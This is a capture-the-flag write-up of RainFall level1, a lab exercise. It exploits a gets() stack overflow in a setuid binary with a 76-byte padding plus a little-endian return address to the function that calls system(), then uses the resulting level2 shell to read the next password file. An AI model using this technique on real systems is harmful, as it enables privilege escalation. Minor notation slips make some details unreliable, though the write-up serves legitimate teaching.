```
level1@RainFall:~$ ll
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 ./
dr-x--x--x  1 root   root    340 Sep 23  2015 ../
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1*
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
```

Let's see what the code is doing
```
8048480:       55                      push   %ebp
 8048481:       89 e5                   mov    %esp,%ebp
 8048483:       83 e4 f0                and    $0xfffffff0,%esp
 8048486:       83 ec 50                sub    $0x50,%esp
 8048489:       8d 44 24 10             lea    0x10(%esp),%eax
 804848d:       89 04 24                mov    %eax,(%esp)
 8048490:       e8 ab fe ff ff          call   8048340 <gets@plt>
```
Ohohoh gets, what is it ?
A bad function, let's read the man
```
DESCRIPTION
    Never use this function.
    Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read
```
What does that mean ?
that means that if we proceed correctly, we will be able to perform a buffer overflow.
In the code we see: 
sub 0x50, esp
This is an buffer in the stack, and then it's given to gets.
SOOOOOOOO this is the buffer to overflow, 0x50
```
level1@RainFall:~$ python -c 'print "A" *80' | ./level1
Segmentation fault (core dumped)
```
Let's go we have a behaviour,
now how does the stack works, 
you have your buffer, and right after something called eip (rip 64x architectures)
this is a pointer to the next instruction, so if we change this pointer with the value of the desired adress, the next instruction will change.
But what is the adress ?
Let's see the code again.

```
08048444 <run>:
 8048444:       55                      push   %ebp
 8048445:       89 e5                   mov    %esp,%ebp
 8048447:       83 ec 18                sub    $0x18,%esp
 804844a:       a1 c0 97 04 08          mov    0x80497c0,%eax
 804844f:       89 c2                   mov    %eax,%edx
 8048451:       b8 70 85 04 08          mov    $0x8048570,%eax
 8048456:       89 54 24 0c             mov    %edx,0xc(%esp)
 804845a:       c7 44 24 08 13 00 00    movl   $0x13,0x8(%esp)
 8048461:       00
 8048462:       c7 44 24 04 01 00 00    movl   $0x1,0x4(%esp)
 8048469:       00
 804846a:       89 04 24                mov    %eax,(%esp)
 804846d:       e8 de fe ff ff          call   8048350 <fwrite@plt>
 8048472:       c7 04 24 84 85 04 08    movl   $0x8048584,(%esp)
 8048479:       e8 e2 fe ff ff          call   8048360 <system@plt>
 804847e:       c9                      leave
 804847f:       c3                      ret
```
This is a function which calls system, I don't know for you but I personnaly like that, so How do we change the buffer ?
Let's make a payload, BUT you have to know, what you do that you have to put your adress in a little endian format.
So the adress we want is  0x08048444 (the adress of the function)
0x08048444 => x/44x/84x/80x/08

Let's see the exact size of our buffer,
We allocated 80bytes, BUT then we said lea 0x10(%ebp), %eax which means that the buffer starts a 16
We then take the ebp padding which is 12, and GGs, we know we have to write, 76 characters.

```
level1@RainFall:~$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```
Ok ?
So it did work but we didn't keep the bash open let's change our command !
```
level1@RainFall:~$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
Good... Wait what?
whoami
level2
```
And GGs, let's go to level2 then !
```
pwd
/home/user/level1
cd ../level2
ls -la
total 17
dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
cat .pass
<hidden>
```
And GGs, let's go to the next one 
